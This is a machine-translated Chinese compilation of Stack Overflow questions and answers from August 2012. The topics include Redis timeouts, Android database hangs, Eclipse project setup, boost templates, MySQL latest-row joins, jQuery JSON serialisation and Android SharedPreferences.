> 赞同：3
> 
> 时间：2012-08-07T14:12:29.123
> 
> 标签：redis

假设我的客户端向redis服务器发送了'INCR'命令，但是响应包丢失了，所以我的客户端的read()会超时，但是客户端无法判断服务器是否执行了INCR操作。

接下来做什么？重新发送 INCR 或继续下一个命令？如果客户端重新发送INCR，但是如果redis之前在服务器端进行了INCR，这个key会增加2倍，这不是我们想要的。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-07T18:56:15.113

这不是 Redis 特有的问题：它也适用于任何其他数据存储（包括事务性数据存储）。这个问题没有解决方案：您只能希望将问题最小化。

例如，有些人倾向于为他们的超时设置非常激进的值，认为 Redis 应该是一个软实时数据存储。Redis 速度很快，但你还需要考虑网络，以及系统本身。网络相关问题可能会产生高延迟。如果系统开始交换，它将非常严重地影响 Redis 响应时间。

我倾向于认为将超时设置在 2 秒以下在任何 Unix/Linux 系统上都是无稽之谈，如果涉及到网络，我更喜欢 10 秒。人们之所以设置非常低的值，是因为他们希望避免他们的应用程序被阻止：这是一个错误。他们应该将应用程序设计为异步的并设置合理的超时，而不是设置非常低的超时并保持应用程序同步。

超时后，客户端永远不应“继续”执行下一个命令。它应该关闭连接，并尝试打开一个新连接。如果回复（或查询）丢失，则客户端和服务器不太可能重新同步。关闭连接更安全。

您是否应该在重新连接后尝试再次发出 INCR？这真的取决于你。但是，如果刚刚触发了读取超时，则重新连接很可能也会超时。Redis是单线程的，当一个连接慢时，所有连接同时慢。

# android - 当数据库操作和来电同时发生时应用程序停止响应

> ID：11847902
> 
> 赞同：1
> 
> 时间：2012-08-07T14:12:31.247
> 
> 标签：android, sqlite, android-asynctask

当数据库操作和来电同时挂起时，我的应用程序挂起。我将大量数据保存到数据库中。我尝试使用**AsyncTask**也得到了相同的结果。

错误日志

```
 08-07 20:04:27.519: I/BluetoothService(1560): <!>android.server.BluetoothService$2 2390<!> Got Call State change - new call state = 1

    08-07 20:04:27.529: E/BluetoothHandsfree(1660):
    <!>com.android.phone.BluetoothHandsfree 3262<!> [BTUI]
    ======================================= 08-07 20:04:27.529: E/BluetoothHandsfree(1660): <!>com.android.phone.BluetoothHandsfree
    3262<!> [BTUI] = RING (INCOMING) 08-07 20:04:27.529:
    E/BluetoothHandsfree(1660): <!>com.android.phone.BluetoothHandsfree
    3262<!> [BTUI] = FORE (IDLE) 08-07 20:04:27.529:
    E/BluetoothHandsfree(1660): <!>com.android.phone.BluetoothHandsfree
    3262<!> [BTUI] = BACK (IDLE) 08-07 20:04:27.529:
    E/BluetoothHandsfree(1660): <!>com.android.phone.BluetoothHandsfree
    3262<!> [BTUI] ======================================= 08-07
    20:04:27.529: E/BluetoothHandsfree(1660):
    <!>com.android.phone.BluetoothHandsfree 3262<!> [BTUI] oCall(0) ->
    nCall(0) 08-07 20:04:27.529: E/BluetoothHandsfree(1660):
    <!>com.android.phone.BluetoothHandsfree 3262<!> [BTUI] oCallsetup(0)
    -> nCallsetup(1) 08-07 20:04:27.529: E/BluetoothHandsfree(1660): <!>com.android.phone.BluetoothHandsfree 3262<!> [BTUI] oCallheld(0)
    -> nCallheld(0) 08-07 20:04:27.529: E/BluetoothHandsfree(1660): <!>com.android.phone.BluetoothHandsfree 3262<!> [BTUI]
    mRingingNumber (+918041113704) 08-07 20:04:27.549:
    E/BluetoothHandsfree(1660): <!>com.android.phone.BluetoothHandsfree
    3262<!> [BTUI] BtUiA2DPSuspend() : mA2dpState( 0 ) : skip...

08-07 20:04:27.579: D/DMClient(1666): <!>com.lge.omadmclient.DmcAgentModeReceiver 17<!> DmcDateChangedReceiver.onReceive()
08-07 20:04:27.589: D/InCallScreen(1660): <!>com.android.phone.InCallScreen 6486<!> Handler: handling message { what=101 when=-1s361ms obj=android.os.AsyncResult@405cdfc0 } while not in foreground
08-07 20:04:27.589: D/InCallScreen(1660): <!>com.android.phone.InCallScreen 6486<!> onPhoneStateChanged()...
08-07 20:04:27.589: D/InCallScreen(1660): <!>com.android.phone.InCallScreen 6486<!> onPhoneStateChanged: Activity not in foreground! Bailing out...
08-07 20:04:27.589: V/DATA(1660): <!>com.android.internal.telephony.MMDataConnectionTracker 1819<!> [DCT] onUpdateDataConnections: reason=2GVoiceCallStarted
08-07 20:04:27.589: V/DATA(1660): <!>com.android.internal.telephony.MMDataConnectionTracker 1819<!> [DCT] ---dc list---
08-07 20:04:27.599: V/DATA(1660): <!>com.android.internal.telephony.MMDataConnectionTracker 1819<!> [DCT] ---ds list---
08-07 20:04:27.599: V/DATA(1660): <!>com.android.internal.telephony.MMDataConnectionTracker 1819<!> [DCT] ds= SERVICE_TYPE_DEFAULT, enabled = false, active = v4:IDLE v6:IDLE
08-07 20:04:27.599: V/DATA(1660): <!>com.android.internal.telephony.MMDataConnectionTracker 1819<!> [DCT] ds= SERVICE_TYPE_MMS, enabled = false, active = v4:IDLE v6:IDLE
08-07 20:04:27.639: I/AudioService(1560): <!>android.media.AudioService 2658<!>  AudioFocus  abandonAudioFocus() from android.media.AudioManager@40769900
08-07 20:04:27.639: D/DrmServiceStart(11978): <!>com.lge.drmservice.DrmServiceStart 74<!> Network Connectiviy changed
08-07 20:04:27.689: D/DMClientService(14043): <!>com.lge.omadmclient.DmclientService 3088<!> updateNetworkState, networkType(0:Mobile, 1:WiFi): 0, networkState :DISCONNECTED
08-07 20:04:27.689: V/DATA(1660): <!>com.android.internal.telephony.MMDataConnectionTracker 1819<!> [DCT] ds= SERVICE_TYPE_SUPL, enabled = false, active = v4:IDLE v6:IDLE
08-07 20:04:27.689: V/DATA(1660): <!>com.android.internal.telephony.MMDataConnectionTracker 1819<!> [DCT] ds= SERVICE_TYPE_DUN, enabled = false, active = v4:IDLE v6:IDLE
08-07 20:04:27.699: V/DATA(1660): <!>com.android.internal.telephony.MMDataConnectionTracker 1819<!> [DCT] ds= SERVICE_TYPE_HIPRI, enabled = false, active = v4:IDLE v6:IDLE
08-07 20:04:27.699: I/DATA(1660): <!>com.android.internal.telephony.MMDataConnectionTracker 1823<!> [DCT] isReadyForData = true
08-07 20:04:27.699: I/DATA(1660): <!>com.android.internal.telephony.MMDataConnectionTracker 1823<!> [DCT] getRadioTechnology = RADIO_TECH_EDGE
08-07 20:04:27.699: I/DATA(1660): <!>com.android.internal.telephony.MMDataConnectionTracker 1823<!> [DCT] dataRegState = 0
08-07 20:04:27.699: I/DATA(1660): <!>com.android.internal.telephony.MMDataConnectionTracker 1823<!> [DCT] isReadyForData1 = true
08-07 20:04:27.699: I/DATA(1660): <!>com.android.internal.telephony.MMDataConnectionTracker 1823<!> [DCT] isReadyForData2 = true
08-07 20:04:27.699: I/DATA(1660): <!>com.android.internal.telephony.MMDataConnectionTracker 1823<!> [DCT] r.isGsm() isReadyForData = true
08-07 20:04:27.699: I/DATA(1660): <!>com.android.internal.telephony.MMDataConnectionTracker 1823<!> [DCT] Final isReadyForData = true
08-07 20:04:27.699: I/DATA(1660): <!>com.android.internal.telephony.MMDataConnectionTracker 1823<!> [DCT] Ready for data : 
08-07 20:04:27.699: I/DATA(1660): <!>com.android.internal.telephony.MMDataConnectionTracker 1823<!> [DCT]    getDesiredPowerState() = true
08-07 20:04:27.699: I/DATA(1660): <!>com.android.internal.telephony.MMDataConnectionTracker 1823<!> [DCT]    mCm.getRadioState() = RADIO_ON
08-07 20:04:27.709: I/DATA(1660): <!>com.android.internal.telephony.MMDataConnectionTracker 1823<!> [DCT]    [DataRadioTech = RADIO_TECH_EDGE, data network state = 0, mMasterDataEnabled = true, is Roaming = false, dataOnRoamingEnable = false, isPsRestricted = false, desiredPowerState  = true, mSIMRecords = true/40445, cdmaSubSource = 1/, mRuimRecords = ]
08-07 20:04:27.759: V/DBController:UpdateRecord(14118): <!>com.tycoon.db.controller.DBController 2398<!> Number Records Updated = 1
08-07 20:04:27.989: E/Tethering(1560): <!>com.android.server.connectivity.Tethering 272<!> active iface (usb0) reported as added, ignoring
08-07 20:04:27.989: D/CallNotifier(1660): <!>com.android.phone.CallNotifier 2421<!> - showing incoming call (custom ring query complete)...
08-07 20:04:27.989: D/CallNotifier(1660): <!>com.android.phone.CallNotifier 2421<!> showIncomingCall()...
08-07 20:04:27.989: D/WifiService(1560): BroadcastReceiver : android.intent.action.BATTERY_CHANGED
08-07 20:04:27.989: D/WifiService(1560): ACTION_BATTERY_CHANGED pluggedType: 2
08-07 20:04:27.999: D/CallNotifier(1660): <!>com.android.phone.CallNotifier 2421<!> - updating notification from showIncomingCall()...
08-07 20:04:28.019: D/StatusBarService(1635): Notification has fullScreenIntent; sending fullScreenIntent
08-07 20:04:28.019: I/ActivityManager(1560): Starting: Intent { act=android.intent.action.MAIN flg=0x10840000 cmp=com.android.phone/.InCallScreen } from pid -1
08-07 20:04:28.049: V/DBController:InsertRecord(14118): <!>com.tycoon.db.controller.DBController 1522<!> Record Inserted at rowId = 2 
```

# objective-c - 在模态视图控制器上模拟内存警告清除前一个控制器的内容

> ID：11847906
> 
> 赞同：0
> 
> 时间：2012-08-07T14:12:46.130
> 
> 标签：objective-c, ipad, modalviewcontroller, didreceivememorywarning

我有一个模态视图控制器作为我的应用程序中的主控制器。在一个流程中，它可以在其上呈现另一个模态视图控制器。所以问题是当我试图在第二个视图控制器上模拟内存警告时，主视图控制器收到`- [didReceiveMemoryWarning:]`消息，但它`- [viewDidUnload:]`没有被调用。尽管如此，当第二个视图控制器被关闭时，主视图控制器的所有内容都会消失。有人可以给我一个线索我该怎么办吗？提前致谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-07T17:15:31.923

模态框与其父级的关系不允许它（父级）在呈现子级时释放。这就是为什么 viewDidUnload 没有被调用的原因。如果您的父母在孩子长大的时候离开，那将是个坏消息，因为创建空引用和灾难就没有什么可以驳回的了。

如果您在`-[didRecieveMemoryWarning]`主控制器的方法中释放任何东西，那么这就是为什么当您返回它时它会消失。

希望这可以帮助。

# iis - ElmahR 无法在 IIS 上正确加载

> ID：11847911
> 
> 赞同：0
> 
> 时间：2012-08-07T14:13:01.283
> 
> 标签：iis, deployment, iis-7.5, elmah

在过去的两天里，我一直在摆弄 ElmahR，并计划将它推到我们的开发平台进行测试。但是，在 IIS 7.5 上运行时无法正确加载

我已经使用 IIS Express 在 3 台不同的机器上启动了部署的解决方案，没有任何问题。在 IIS 7.5 上，它会卡在“正在加载...”或“发送命令”，这取决于它是设置为默认网站下的子应用程序还是独立的 Web 应用程序。

使用的系统是Windows Server 2008 r2 sp1，IIS 7.5 .NET 4 应用程序池集成模式。（所有 3 台机器）

我找不到手头的问题；希望你能帮忙。亲切的问候。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-13T20:37:40.950

这还不是一个答案，它应该是一个评论，但我不能在这里评论:) 我是 ElmahR 的作者，我不知道这个问题，上次我在 IIS 7.5 上测试它是不久前，我做到了没有任何问题，我将不得不重新检查。现在我不在家，但我会在回来的时候看看它，可能在下周末之前。并感谢您使用它:)

**更新**：我想我解决了这个问题，我在[这里](http://www.robychechi.it/roby/tech-blog/elmahr-0.9.1-is-out)写了博客。基本上，有几个 javascript 错误：

*   在某一点上，我没有正确设置应用程序的根目录
*   在 IE7/8 下，需要更好地检查`plugins`对象（相同的代码在 IE9/Chrome/Firefox/Safari 上运行良好......）

在线存储[库](https://bitbucket.org/wasp/elmahr/wiki/Home)是最新[的，示例设置压缩文件](https://bitbucket.org/wasp/elmahr/downloads/ElmahRSampleSetup.0.9.1.zip)也是如此。

# putty - 腻子：复制和粘贴 -> 保留空白

> ID：11847917
> 
> 赞同：3
> 
> 时间：2012-08-07T14:13:12.933
> 
> 标签：putty

我们想在工作中切换到 Putty，但我们有一个大问题：在错误情况下，我们必须从日志文件中复制一些行（使用 less/vi 和鼠标复制和粘贴）。这些行可以是 32 KB 长并且包含几个空白，这些空白需要被保留。不幸的是，如果复制的内容因不适合窗口中的一行而被换行，Putty 似乎会用换行符替换尾随空格。

例如，如果我们有该行（带有需要保留的尾随空格 -> 如果您选择示例，您会看到尾随空格）：

```
LINE START, WINDOW IS 80 CHARACTERS WIDTH, BUT LINE IS 32KB                    
  SO LINE IS WRAPPED IN THE PUTTY WINDOW                                       
      THE TRAILING SPACES NEED TO BE PRESERVED....                             
      BUT USING PUTTYS COPY & PASTE, PUTTY REPLACES SPACE CHARACTERS BY NEWLINE
                                                                ...LINE END 
```

我们复制和粘贴，我们得到（选择第二个例子）：

```
LINE START, WINDOW IS 80 CHARACTERS WIDTH, BUT LINE IS 32KB
  SO LINE IS WRAPPED IN THE PUTTY WINDOW
      THE TRAILING SPACES NEED TO BE PRESERVED....
      BUT USING PUTTYS COPY & PASTE, PUTTY REPLACES SPACE CHARACTERS BY NEWLINE
                                                                ...LINE END 
```

Putty 删除尾随空格并插入换行符。可以在 Putty 中配置/更改此行为吗？

谢谢你，克里斯蒂安

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2014-11-28T19:21:57.323

从 PuTTY 复制/粘贴时，我使用了不间断空格来保留尾随空格。我的应用程序正在 ssh-ing 到一个 linux 盒子并使用 Bourne shell 复制/粘贴一些代码，所以我不知道这在其他环境中会有多广泛的工作。

要插入不间断空格，请按住 Alt 键并键入 255，然后松开 Alt 键。以下示例可用于测试。出于某种原因，当我直接从该网页复制/粘贴时，代码不会保留不间断的空间，因此您需要以这种方式对其进行测试：

一个。将以下代码复制/粘贴到记事本中

湾。删除空白=“”中的空格

C。使用 Alt+255 插入不间断空格

d。将代码复制/粘贴到 PuTTY

e. 将输出复制/粘贴回记事本以查看结果

**代码**

```
# non-breaking space, Alt+255
blank=" "
# regular space
space=" "

echo "
blank:$blank
space:$space
" 
```

它为 $blank var 输出尾随空格，但不为 $space var 输出尾随空格。

**输出**

```
blank: 
space: 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-10-28T11:49:40.987

我不确定 Putty 可以做到，但在我的情况下（putty 在 redhat 开放客户端上工作）我将源文件转换为 unix 格式（dos2unix 命令）。现在粘贴工作正常。

# java - Eclipse：项目目录与源目录隔离

> ID：11847919
> 
> 赞同：2
> 
> 时间：2012-08-07T14:13:17.813
> 
> 标签：java, eclipse

我有一个由 Git 存储库管理的 Java 代码。目前，目录结构是

```
myProject    | 
    -- src
    -- bin
    -- lib
    -- .git 
```

目前，每个开发人员都在他想要的工具（Eclipse/Netbeans）下创建自己的开发环境。我想为此代码创建一个 Eclipse 项目并将其添加到我的源存储库中，这样新的 Eclipse 开发人员就不需要手动创建新项目和设置开发环境。我想要这个：

```
myProject
   | 
    -- src
    -- bin
    -- lib
    -- .git
    -- eclipse
     |
      -- .settings/
      -- .project
      -- .classpath 
```

根据我在网上阅读的内容，我不需要将 .metadata 目录添加到存储库中。另外，我知道如果我将 .classpath 文件夹添加到存储库中，在某些情况下我可能会遇到依赖问题，但我宁愿不支持这些有问题的情况（例如不同的 Java 编译器），而不是强制开发人员手动设置类路径。最后，我不想在这个项目中使用 Maven。

简而言之，我的要求是 - 我不想将 Eclipse 项目文件放在根文件夹中 - 我不想在 eclipse 文件夹中复制代码（当我尝试将现有代码导入到隔离的项目文件夹中时会发生这种情况） . 我希望它引用我在名为“src”的文件夹中的源文件 - 我想配置 Eclipse 以将编译输出（.class 文件）放在“bin”文件夹中。

我可以在创建项目时设置后一项，但如果不选择源父目录作为项目文件夹，我无法将 Eclipse 配置为引用源代码（而不是复制它）。

任何帮助深表感谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-07T14:47:26.980

您需要在您想要的位置创建一个项目，然后使用“链接源”目录指向您的实际源代码。

更多信息：

[将 eclipse .project 文件存储在项目目录之外](https://stackoverflow.com/questions/3422261/store-eclipse-project-files-outside-the-project-directory)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-07T15:23:35.743

1.  使用 eclipse 子目录在上面创建目录结构。
2.  创建一个新的动态 Web 应用程序（或其他任何东西，假设基于 .settings）
3.  取消选中`Use default location`并指定您的`eclipse`目录，点击下一步
4.  删除唯一的源文件夹
5.  `Generate web.xml...`不选中
6.  文件 > 新建 > 文件夹，然后单击高级>>
7.  用于`Link to alternate location (Linked Folder)`创建链接到顶级 src 和 bin 的 src 和 bin 目录。
8.  右键单击项目并使用 File > New > Source folder 添加链接的 src 文件夹，输出目录为 bin
9.  将 WebContent 移动到 WebContent.bak 并创建一个链接到顶层的新 WebContent 目录。
10.  将 WebContent.bak 的内容移动到 WebContent
11.  手动编辑`eclipse/.settings/org.eclipse.wst.common.component`以将 WebContent.bak 更改为 WebContent（是否有此设置？找不到）
12.  刷新项目
13.  右键单击项目并选择 Java EE 工具 > 生成部署描述符存根

# dll - 我的电脑中相同的dll文件是x64，但在另一台电脑上它们是x86，奇怪

> ID：11847928
> 
> 赞同：0
> 
> 时间：2012-08-07T14:13:53.010
> 
> 标签：dll, x86, 64-bit, dependency-walker

我有一个程序，它具有`MSVCP100D.DLL`和`MSVCR100D.DLL`x64 版本的依赖关系。

这是**我**电脑中[DependencyWalker](http://dependencywalker.com)的截图：

 **![在此处输入图像描述](../Images/1557fc8d304f57ab03a915061379b6eb.png)

当我将此程序复制到我朋友的计算机时，它无法运行，因为没有这两个文件。然后我将2个dll文件复制到他的电脑上。

但是在执行程序的时候报错了，我用dependency walker检查的时候发现了一个很奇怪的东西。这是他的截图：

![在此处输入图像描述](../Images/7b7c5b0c1610b284a0c9f4de4d90b16d.png)

为什么它们在我的计算机中是“x64”而在他的计算机中是“x86”？如何解决？

* * *

**更新**

我朋友的系统也是win7 x64。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-07T14:54:59.030

最后，几个小时后，我们修复了它。奇怪的事情太多了。

第一的。我的系统是win7 x64。

这里举个`MSVCP100D.DLL`例子。我的电脑里有两个不同的MSVCP100D.DLL ，一个在. `windows/system32`，一个在`windows/SysWOW64`. 它们有不同的尺寸。

看截图： ![在此处输入图像描述](../Images/52897f4dbe571ba47af932b61b0e55e7.png)

但是在“一切”中，它们的大小相同（甚至修改日期相同），我认为它们是相同的。

![在此处输入图像描述](../Images/f15cb74fe903e5a64c598c9fa1e41a93.png)

然后我通过一个名为QQ的IM软件从system32发送dll。

我拖出来的文件`windoes/system32`是991K，但是QQ显示的大小是“726K”：

![在此处输入图像描述](../Images/fc0714a8ac7e184d177dbddef478f7fd.png)

但是，如果我将文件复制到另一个目录，例如`D:\`，然后再次发送，大小是正确的“991K”。

最后，我把这些dll文件复制到另一个目录，打包成zip文件，发送正确，程序在朋友的电脑上运行良好。**

# boost - 如何在 c++ 模板中使用 boost::is_same 以及 boost::lambda::bind

> ID：11847930
> 
> 赞同：1
> 
> 时间：2012-08-07T14:14:03.413
> 
> 标签：boost, boost-bind, boost-function, boost-lambda, boost-signals2

我正在尝试将泛型连接`boost::function<void(void)>`到许多不同签名的 boost::signals2 。我可以使用 boot::lambda::bind 通过将返回值作为绑定参数的一部分传递来执行绑定部分，但是当返回类型为 void 时会出现问题

例子：

```
template<typename S>
class signal
{
 Connection VoidConnect(boost::function<void(void)> callback)
  {
    //if(boost::is_same<void, typename S::result_type>::value) // Doesn't seem to work
    if ( boost::is_void<typename S::result_type>::value )  // Doesn't seem to work
    {
       //GetSignal returns the actual boost signal
       // typename 'S' will be a boost::function with the same signature as the signal
      return GetSignal().connect( boost::lambda::bind(callback) );        
    }
    else
    {
      typename S::result_type f;
      return GetSignal().connect( (boost::lambda::bind(callback), f ) );
    }
  }
} 
```

我不断收到编译错误

```
error: variable or field ‘f’ declared void 
include/boost/function/function_template.hpp:132:42: error: void value not ignored as it ought to be 
```

从错误中可以看出，带有 boost::is_void 的 if 条件（boost::is_same 也不是）似乎不起作用，有人知道为什么吗？有没有更好的方法来做这个绑定？

谢谢，萨克

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-07T15:14:32.900

您在运行时检查此条件，因此两个分支在编译时都需要正确（显然不是）。相反，只需将您的模板专门用于 void：

```
// WARNING: untested code!

template<typename S> 
class signal 
{ 
 Connection VoidConnect(boost::function<void(void)> callback) 
  { 
    typename S::result_type f; 
    return GetSignal().connect( (boost::lambda::bind(callback), f ) ); 
  } 
};

template<> 
class signal <void>
{ 
 Connection VoidConnect(boost::function<void(void)> callback) 
  { 
    return GetSignal().connect( boost::lambda::bind(callback) );         
  } 
}; 
```

如果要在成员函数上使用 enable_if，则应将其定义为模板。请参阅以下代码：

```
#include <boost/signals2.hpp>
#include <boost/utility/enable_if.hpp>
#include <boost/type_traits/is_void.hpp>
#include <boost/lambda/bind.hpp>
#include <boost/lambda/lambda.hpp>

using namespace boost::signals2;
class connect
{ 
public:
    template<typename S> 
    connection VoidConnect(boost::function<void(void)> callback, S &sig,
        typename boost::disable_if<boost::is_void<typename S::result_type> >::type *dummy = 0)
    {
    typename S::result_type res;  
    return sig.connect( (boost::lambda::bind(callback), *res) );  
    }

    template<typename S> 
    connection VoidConnect(boost::function<void(void)> callback, S &sig,
        typename boost::enable_if<boost::is_void<typename S::result_type> >::type *dummy = 0)
    {
    return sig.connect( boost::lambda::bind(callback) );          
    }

}; 

int main()
{
    boost::function<void(void)> f;
    signal<void(int)> sig1;
    connect s1;
    s1.VoidConnect(f, sig1);

    signal<int(int)> sig2;
    connect s2;
    s2.VoidConnect(f, sig2);
} 
```

# mysql - 如何在一对多关系上选择 MySQL 1-to-LAST

> ID：11847931
> 
> 赞同：1
> 
> 时间：2012-08-07T14:14:04.960
> 
> 标签：mysql, one-to-many, greatest-n-per-group, one-to-one

我有 2 个表——表 1 是主文件，表 2 是活动文件。

关系是一对多。

我正在生成一份报告，我想要返回的是每个主文件行仅加入到相关主 ID 的最后一个活动行。

我不确定如何请求最后一个活动行。我下面的代码返回每个活动行（理所当然）。

感谢您的帮助。

```
 SELECT *
    FROM master_file AS master
    INNER JOIN activity_file AS activity ON activity.id = master.id
    ORDER BY master.display_name 
```

活动文件有一个名为`entry_date`. 它是记录每个活动的日期和时间戳。我只是想选择最后一个`entry_date`.

例如：

表 2 - 活动看起来像这样

```
ID ACTIVITY ENTRY_DATE
1 Update 2012-08-01 09:00:00
1 Edit 2012-08-01 13:45:15
3 Create 2012-07-15 10:09:52
3 Delete 2012-07-22 23:02:00
3 Add 2012-08-05 04:33:00
4 Edit 2012-08-03 15:12:00 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-07T14:23:23.757

解决此问题的一种标准方法是创建一个内联视图，以查找每个 ID 的最后一个 entry_date。

```
SELECT *
    FROM master_file AS master
    LEFT JOIN activity_file AS activity ON activity.id = master.id
    LEFT JOIN (select id , max(entry_date) entry_date
                From activity_file 
                group by id) last_activity
    ON activity_file.id = last_activity.id
      and  activity_file.entry_date= last_activity.entry_date

    ORDER BY master.display_name 
```

这种方法的一个问题是，对于给定的 id，您可能有多个带有 max(entry_date) 的记录。您要么需要让您的业务规则来处理这个问题（例如，只需为该案例显示多个记录），要么您需要找出一个决胜局。你想要的最后一件事是让它不确定

# html - 如何保存插入图像的位置（验证时）？

> ID：11847932
> 
> 赞同：0
> 
> 时间：2012-08-07T14:14:06.503
> 
> 标签：html, css

我有带有 jQ​​uery 验证的输入，并且我正在插入图像，当需要输入时，它会增加一些边距，并移动我的 div。

这是我未经验证的字段：

![](../Images/83918df1c75bb972797dd98ec883bd75.png)

和有错误的输入： ![](../Images/a726f7065f4bc319ffb5ed2b2e6032e1.png)

我尝试了不同的变体：添加 z-index、定位，但不能这样做。

这是我的 html 错误：

```
 <form ... >
   <div class="field3">
 <div class="pickers">
<span id="pickers">From</span>
<input id="report_start_date" name="report[start_date]" size="30" type="text" class="hasDatepicker error"><label for="report_start_date" generated="true" class="error" style="">bla bla bla</label><
  </div>
   <div class="pickers"><span id="pickers">To</span>
  <input id="report_end_date" name="report[end_date]" size="30" type="text" class="hasDatepicker error"><label for="report_end_date" generated="true" class="error" style="">bla bla bla</label>

   </div>
   </div>
    <input name="commit" type="submit" value="Run Report">
   </form> 
```

我的CSS：

```
label.error {
background: url('../images/not_valid.png') no-repeat;
display:inline;
margin-left: 5px;
padding: 15px 0 5px 5px;
color:transparent;
 }
 label.valid {
background: url('../images/valid.png') no-repeat;
display:inline;
margin-left: 5px;
padding: 15px 0px 10px 50px;
width: 47px;
height: 36px;
 color:transparent;
 }
#pickers{
font-weight: bold;
}
.pickers{
display: inline;
padding-top: 5px;
 } 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-07T14:40:26.313

（从问题评论中复制）

尝试使用包含验证标记图像`position: absolute`的s。`label`这样他们就不会参与正常的布局并在您需要显示/隐藏它们时更新它。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-07T14:19:53.287

随意放置它，并为其赋予 css 样式`visibility:hidden;`，使其成为文档流的一部分，同时隐藏它直到您需要它。然后，当你需要它时，使用 jQuery（或任何你想使用的东西——jQuery 最简单）来取消隐藏它。

# javascript - 使用 jQuery.map 后使用 JSON.stringify 的问题

> ID：11847933
> 
> 赞同：3
> 
> 时间：2012-08-07T14:14:09.423
> 
> 标签：javascript, jquery, json, web-scraping

我正在编写一个书签（最终将成为一个插件）来在指定的 div 下抓取 jQuery 中的列表项的网页。我在使用时遇到问题`JSON.stringify`

以下代码允许我将每个单独的项目转换为 JSON，但在`join`用于连接每个字符串时会出现问题。

```
var dMap = $("div").filter($("#<div-id>")).find("li").map(function() {
    var iObject = {
        id: $(this).data('id'),
        text: $(this).text(),
        list_name: $(this).closest('div').attr('id')
    };
    return JSON.stringify(iObject);
});
console.log(dMap); 
```

第二段代码正确地创建了数组中的每个对象，但生成的数组不记录生成的 JSON。

```
var dMap = $("div").filter($("#,div-id.")).find("li").map(function() {
    return {
        id: $(this).data('id'),
        text: $(this).text(),
        list_name: $(this).closest('div').attr('id')
    };
});
console.log(dMap);
var json = JSON.stringify(dMap);
console.log(json); 
```

有任何想法吗？

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-08-07T14:29:04.300

根据以下文档[`.map`](http://api.jquery.com/map/)：

> 由于返回值是一个 jQuery 包装的数组，因此 get() 返回的对象与基本数组一起使用是很常见的。

你有没有尝试过：

```
var json = JSON.stringify(dMap.get()); 
```

# zend-framework - zend 通过 jquery ajax 响应设置值子表单元素

> ID：11847935
> 
> 赞同：0
> 
> 时间：2012-08-07T14:14:19.233
> 
> 标签：zend-framework, jquery, zend-form

我无法为从数据库中获取的 ef_name 设置值。单个 id 有多行。

**形式**

```
public function addRow()
    {
        $row_form = new Zend_Form(array(
            'elements' => array(
                'ef_name' => array(
                    'type' => 'text'
                ),
            ),          
        ));

        $new_form_index = count($this->_subForms)+1;
        $row_form->setElementsBelongTo('diam['.$new_form_index.']');
        $this->addSubform($row_form, $new_form_index);
        return $row_form;
    }

    public function init() {
 $this->addElement('hidden', 'id', array(
      'value' => 1
    ));

    for($cdr=0;$cdr<10;$cdr++)
            $this->addRow();    
      } 
```

**看法**

```
<?php 
echo $this->form ;
$this->jQuery()->enable(); 
?>

<?php $this->jQuery()->onLoadCaptureStart(); ?>
jQuery('#category').change(newEcat);
<?php $this->jQuery()->onLoadCaptureEnd(); ?>

<script><!--
    function newEcat()
    {
        var p = $("#category").val();       

    var response =   $.ajax({

        url: "<?php echo $this->url(array('controller'=>'index',
'action'=>'details')) ?>", 
        type: "GET",       
        data: {id: p}, 
        cache: false,
        success: function(text){
           response = text;

            $("#category").val($(text).find("select[name='category']").val());

            $("#ef_name").val($(text).find("select[name='ef_name']").val());    

},
error: function() { alert('Sorry, no family members defined.'); }

    });

}

--></script> 
```

**控制器**

```
 if ($this->getRequest()->isXmlHttpRequest()) {  

    $this->_helper->layout->disableLayout();
    $this->_helper->viewRenderer->setNoRender(TRUE);

    $id = $this->_getParam(id);             
    $form->category->setValue($id);     

 } 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-12T08:19:17.847

**看法**

```
function newEcat()
{

    var p = $("#category").val();

    var response =   $.ajax({

    url: "<?php echo $this->url(array('controller'=>'index', 'action'=>'details')) ?>", 
    type: "GET",       
    dataType: 'json',
    data: {id: p}, 
    cache: false,
    success: function(text){

    if(JSON.stringify(text) == '[]')        
    alert('Sorry, there are no family details for this employee.');

        for(var valVar=0;valVar<10;valVar++){               
        valVarinc   =   valVar+1;
            $("#diam-"+valVarinc+"-ef_name").val('');

            }

        for(var valVar=0;valVar<10;valVar++){               
        valVarinc   =   valVar+1;
        if(text[valVar].ef_name != ''){
            $("#diam-"+valVarinc+"-ef_name").val(text[valVar].ef_name);             
            }

            }

},
error: function() { alert('Sorry, there are no family details for this employee.'); }
 });

} 
```

**控制器**

```
if ($this->getRequest()->isXmlHttpRequest()) {
         $id = $this->_getParam(id);                        
         $form->category->setValue($id);    

} 
```

# android - 在 BroadcastReceiver 中未定义 getPreferences(MODE_PRIVATE)

> ID：11847941
> 
> 赞同：4
> 
> 时间：2012-08-07T14:14:34.483
> 
> 标签：android

我有一个带有活动和服务的应用程序，我需要在活动中保存一些值并在服务中检索。

我可以在活动中使用 SharedPreferences 保存该值，但是，当我尝试在 BroadcastReceiver 中检索该值时，它说 **getPreferences 未定义服务。**

**如何在 BroadcastReceiver 中检索我的值？**

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-08-07T14:22:37.920

**编辑**以反映原始问题从`Service`到的变化`BroadcastReceiver`。

而不是在使用`getPreferences(int mode)`中`Activity`使用...

```
getSharedPreferences(String name, int mode). 
```

该`getPreferences(int mode)`方法是上述的一种方便方法，只需将`Activity`类名作为`name`参数传递。这意味着它实际上应该只用于给定`Activity`的存储它自己的内部首选项，而不是需要对其他应用程序组件全局的首选项。

`BroadcastReceiver`在方法的情况下，`onReceive(...)`传递了一个`Context`参数，因此您可以使用它`context.getSharePreferences(<some_name>, <mode>)`来获取`SharedPreferences`保存的`Activity`.

* * *

## 回答 #2
